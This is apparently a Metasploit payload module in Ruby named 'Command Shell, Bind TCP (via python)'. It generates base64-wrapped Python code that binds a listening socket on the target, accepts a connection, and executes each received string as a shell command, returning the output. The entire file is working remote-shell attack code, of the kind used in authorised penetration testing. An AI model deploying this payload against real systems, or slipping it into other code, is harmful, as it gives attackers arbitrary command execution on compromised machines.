require 'msf/core/handler/bind_tcp'
require 'msf/core/payload/python'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module MetasploitModule

  CachedSize = 557

  include Msf::Payload::Single
  include Msf::Payload::Python
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name' => 'Command Shell, Bind TCP (via python)',
      'Description' => 'Creates an interactive shell via python, encodes with base64 by design',
      'Author' => 'mumbai',
      'License' => MSF_LICENSE,
      'Platform' => 'python',
      'Arch' => ARCH_PYTHON,
      'Handler' => Msf::Handler::BindTcp,
      'Session' => Msf::Sessions::CommandShell,
      'PayloadType' => 'python',
      'Payload' =>
        {
          'Offsets' => { },
          'Payload' => ''
        }
      ))
  end

  def generate
    super + command_string
  end

  def command_string
    cmd = ''
    dead = Rex::Text.rand_text_alpha(3)
    # Set up the socket
    cmd << "import socket,subprocess\n"
    cmd << "so=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n"
    cmd << "so.bind(('#{datastore['RHOST']}',#{ datastore['LPORT']}))\n"
    cmd << "so.listen(1)\n"
    cmd << "so,addr=so.accept()\n"
    cmd << "#{dead}=False\n"
    cmd << "while not #{dead}:\n"
    cmd << "\tdata=so.recv(1024)\n"
    cmd << "\tp=subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n"
    cmd << "\tstdout_value=p.stdout.read()+p.stderr.read()\n"
    cmd << "\tso.send(stdout_value)\n"

    py_create_exec_stub(cmd)
 end
end
